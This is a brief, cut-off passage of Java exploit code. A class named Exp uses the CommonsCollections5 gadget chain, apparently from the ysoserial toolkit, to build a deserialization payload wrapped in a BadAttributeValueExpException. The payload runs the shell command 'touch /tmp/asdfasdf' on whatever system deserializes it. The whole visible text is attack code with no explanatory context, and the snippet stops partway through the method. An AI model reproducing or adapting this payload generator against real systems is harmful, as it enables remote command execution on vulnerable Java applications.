...
class Exp{
    public static byte[] getObject() throws Exception{
        try{
            CommonsCollections5 commonsCollections5 = new CommonsCollections5();
            BadAttributeValueExpException exp = commonsCollections5.getObject("touch /tmp/asdfasdf");
